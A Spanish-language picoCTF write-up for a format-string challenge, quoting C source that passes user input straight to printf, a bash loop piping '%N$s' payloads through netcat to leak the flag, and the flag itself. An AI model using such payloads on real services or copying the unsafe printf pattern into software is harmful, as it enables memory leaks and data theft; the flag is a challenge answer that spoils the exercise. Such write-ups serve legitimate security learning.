## Descripción
Story telling class 1/2

Additional details will be available after launching your challenge instance.

Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using:`nc saturn.picoctf.net 63535`

## Pistas 
Format Strings

## Solución
- Nos conectamos usando `nc saturn.picoctf.net 63535`
```
┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 53935
Tell me a story and then I'll tell you one >> aśñdlkfas
Here's a story - 
aśñdlkfas
```
- El código que nos proporcionaron es el siguiente:
```
┌──(kali㉿kali)-[~]
└─$ cat vuln.c.2   
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
                                        
```
- El programa está directamente imprimiendo el texto que ingresamos. Así que podemos pasarle funciones en formato de cadenas y símbolos.
```
┌──(kali㉿kali)-[~]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 53935 | grep -Ei (pico|ctf); done 
CTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_
```


## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}

## Notas Adicionales
Una vulnerabilidad de cadena de formato es un error en el que la entrada del usuario se pasa como argumento de formato a printf , scanf u otra función de esa familia. El argumento de formato tiene muchas especificaciones diferentes que podrían permitir que un atacante filtre datos si controla el argumento de formato para printf

## Referencias

https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/#:~:text=A%20format%20string%20vulnerability%20is,the%20format%20argument%20to%20printf%20.